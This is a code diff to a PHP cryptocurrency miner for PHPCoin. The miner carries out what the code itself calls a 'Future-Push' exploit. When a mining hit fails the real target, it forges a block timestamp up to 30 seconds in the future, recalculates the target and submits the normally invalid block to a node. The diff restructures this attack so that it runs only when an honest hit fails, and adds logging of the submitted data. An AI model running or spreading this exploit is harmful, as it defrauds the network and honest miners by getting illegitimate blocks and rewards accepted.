@@ -1,11 +1,13 @@
 <?php
 if(php_sapi_name() !== 'cli') exit;
 const DEFAULT_CHAIN_ID = "01";
-const MINER_VERSION = "1.5";
 if(Phar::running()) {
 	require_once 'vendor/autoload.php';
 } else {
 	require_once dirname(__DIR__).'/vendor/autoload.php';
+}
+if(!defined("MINER_VERSION")) {
+    define("MINER_VERSION", "1.5");
 }
 
 class FuturePushMiner extends Miner
@@ -106,6 +108,7 @@ class FuturePushMiner extends Miner
             $t1 = microtime(true);
             $prev_elapsed = null;
             $bestHit = "0";
+            $is_future_push_submission = false;
             while (!$blockFound) {
                 $this->attempt++;
                 if ($this->sleep_time == INF) {
@@ -128,41 +131,32 @@ class FuturePushMiner extends Miner
                 }
                 $target = $bl->calculateTarget($elapsed);
 
-                // --- Future-Push Exploit Logic ---
-                $slipTime = min(30, $this->slipTime);
-                $future_elapsed = $elapsed + $slipTime;
-                $future_target = $bl->calculateTarget($future_elapsed);
-
-                $blockFound = ($hit > 0 && $future_target > 0 && $hit > $future_target);
+                $this->measureSpeed($t1, $th);
 
                 $original_target = $target;
+                $future_target = "0";
 
-                if ($blockFound && !($hit > $original_target)) {
-                    echo PHP_EOL . "[+] Found a block with a normally INVALID hit: $hit (target: $original_target)" . PHP_EOL;
-                    echo "[+] This hit IS valid for a future-pushed block (future target: $future_target)" . PHP_EOL;
-                    echo "[+] Starting Future-Push attack..." . PHP_EOL;
-
-                    $new_block_date = time() + $slipTime;
-                    $elapsed = $new_block_date - $block_date;
-                    $target = $bl->calculateTarget($elapsed); // Recalculate target for submission
-
-                    echo "[+] Manipulated elapsed time: $elapsed" . PHP_EOL;
-                    echo "[+] Manipulated block date: " . date("r", $new_block_date) . PHP_EOL;
+                if (gmp_cmp($hit, $original_target) > 0) {
+                    $blockFound = true;
+                    $is_future_push_submission = false;
+                } else {
+                    $slipTime = min(30, $this->slipTime);
+                    $future_elapsed = $elapsed + $slipTime;
+                    $future_target = $bl->calculateTarget($future_elapsed);
+                    if (gmp_cmp($hit, $future_target) > 0) {
+                        $blockFound = true;
+                        $is_future_push_submission = true;
+                    }
                 }
-                // --- End Exploit Logic ---
-
-
-                $this->measureSpeed($t1, $th);
 
                 $s = sprintf("PID:%-6d Atmpt:%-6d Hght:%-8d Elpsd:%-4d Hit:%-8s Best:%-12s Target:%-12s Slip:%-12s Spd:%-6.2f S:%-2d A:%-2d R:%-2d D:%-2d",
                     getmypid(),
                     $this->attempt,
                     $height,
-                    //number_format($difficulty), // Dfclty:%-10s 
                     $elapsed,
                     number_format(gmp_intval($hit)),
                     number_format(gmp_intval($bestHit)),
-                    number_format(gmp_intval($target)),
+                    number_format(gmp_intval($original_target)),
                     number_format(gmp_intval($future_target)),
                     $this->speed,
                     $this->miningStat['submits'],
@@ -203,15 +197,34 @@ class FuturePushMiner extends Miner
                 continue;
             }
 
+            $submit_elapsed = $elapsed;
+            $submit_date = $new_block_date;
+
             echo "----------------------------------------------------------------" . PHP_EOL;
-            echo "Block Found & Submitting with Future-Push:" . PHP_EOL;
-            echo "  - Hit:                 " . (string)$hit . PHP_EOL;
-            echo "  - Original Target:     " . (string)$original_target . " (INVALID)" . PHP_EOL;
-            echo "  - Future Target:       " . (string)$future_target . " (VALID)" . PHP_EOL;
-            echo "  - Submitted Target:    " . (string)$target . PHP_EOL;
-            echo "  - Slip Time:           " . $slipTime . " seconds" . PHP_EOL;
-            echo "  - Manipulated Elapsed: " . $elapsed . PHP_EOL;
-            echo "  - Final Timestamp:     " . $new_block_date . PHP_EOL;
+            if ($is_future_push_submission) {
+                $slipTime = min(30, $this->slipTime);
+                $submit_date = time() + $slipTime;
+                $submit_elapsed = $submit_date - $block_date;
+                $submit_target = $bl->calculateTarget($submit_elapsed);
+                $future_target_val = $bl->calculateTarget($elapsed + $slipTime);
+
+                echo "Block Found & Submitting with Future-Push:" . PHP_EOL;
+                echo "  - Hit:                 " . (string)$hit . PHP_EOL;
+                echo "  - Original Target:     " . (string)$original_target . " (INVALID)" . PHP_EOL;
+                echo "  - Future Target:       " . (string)$future_target_val . " (VALID)" . PHP_EOL;
+                echo "  - Submitted Target:    " . (string)$submit_target . PHP_EOL;
+                echo "  - Slip Time:           " . $slipTime . " seconds" . PHP_EOL;
+                echo "  - Manipulated Elapsed: " . $submit_elapsed . PHP_EOL;
+                echo "  - Final Timestamp:     " . $submit_date . PHP_EOL;
+
+            } else {
+                $submit_target = $original_target;
+                echo "Block Found & Submitting (Normal):" . PHP_EOL;
+                echo "  - Hit:                 " . (string)$hit . PHP_EOL;
+                echo "  - Target:              " . (string)$submit_target . " (VALID)" . PHP_EOL;
+                echo "  - Elapsed:             " . $submit_elapsed . PHP_EOL;
+                echo "  - Timestamp:           " . $submit_date . PHP_EOL;
+            }
             echo "----------------------------------------------------------------" . PHP_EOL;
 
             $postData = [
@@ -221,9 +234,9 @@ class FuturePushMiner extends Miner
                 'difficulty' => $difficulty,
                 'address' => $this->address,
                 'hit' => (string)$hit,
-                'target' => (string)$target,
-                'date' => $new_block_date,
-                'elapsed' => $elapsed,
+                'target' => (string)$submit_target,
+                'date' => $submit_date,
+                'elapsed' => $submit_elapsed,
                 'minerInfo' => 'phpcoin-miner cli ' . VERSION,
                 "version" => MINER_VERSION
             ];
@@ -269,8 +282,28 @@ class FuturePushMiner extends Miner
         _log("Miner stopped");
     }
 
+    function getMiningInfoFromNode($node) {
+        $url = $node."/mine.php?q=info";
+        echo "Getting info from url ". $url.PHP_EOL;
+        $info_json = url_get($url);
+        echo "Received mining info: ".$info_json.PHP_EOL;
+        if(!$info_json) return false;
+        $info = json_decode($info_json, true);
+        if(empty($info) || empty($info['data']) || !$info['status']=="ok") {
+            _log("Error getting mining info from $node", 3);
+            return false;
+        }
+        return $info;
+    }
+
     private function sendHash($node, $postData, &$response) {
-        $res = url_post($node . "/mine.php?q=submitHash&", http_build_query($postData), 5);
+        $url = $node . "/mine.php?q=submitHash&";
+        echo "Submitting hash to ". $url.PHP_EOL;
+        echo "RAW POST DATA:" . PHP_EOL;
+        print_r($postData);
+        echo "----------------------------------------------------------------" . PHP_EOL;
+        $res = url_post($url, http_build_query($postData), 5);
+        echo "Node response: ".$res.PHP_EOL;
         $response = json_decode($res, true);
         _log("Send hash to node $node response = ".json_encode($response));
         if(!isset($this->miningStat['submitted_blocks'])) {
